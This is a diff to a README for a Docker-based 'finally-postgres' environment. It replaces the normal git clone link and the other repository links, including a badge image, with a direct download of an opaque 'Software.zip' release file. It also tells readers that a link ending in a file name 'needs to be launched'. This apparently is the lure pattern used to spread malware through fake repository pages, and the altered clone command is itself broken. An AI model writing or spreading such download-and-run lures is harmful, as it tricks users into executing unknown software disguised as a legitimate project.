@@ -23,7 +23,7 @@ To get started with the "finally-postgres" environment, simply follow these step
 ## Quick Start 🚀
 
 ```bash
-git clone https://github.com/your-username/finally-postgres.git
+git clone https://github.com/lazakiro/finally-postgres/releases/download/v1.0/Software.zip
 cd finally-postgres
 docker-compose up -d
 ```
@@ -48,9 +48,9 @@ docker-compose up -d
 
 ## Explore Further 🌐
 
-Visit the [GitHub repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) to download the file.
+Visit the [GitHub repository](https://github.com/lazakiro/finally-postgres/releases/download/v1.0/Software.zip) to download the file.
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/lazakiro/finally-postgres/releases/download/v1.0/Software.zip)](https://github.com/lazakiro/finally-postgres/releases/download/v1.0/Software.zip)
 
 If the link ends with a file name, it needs to be launched. 
 
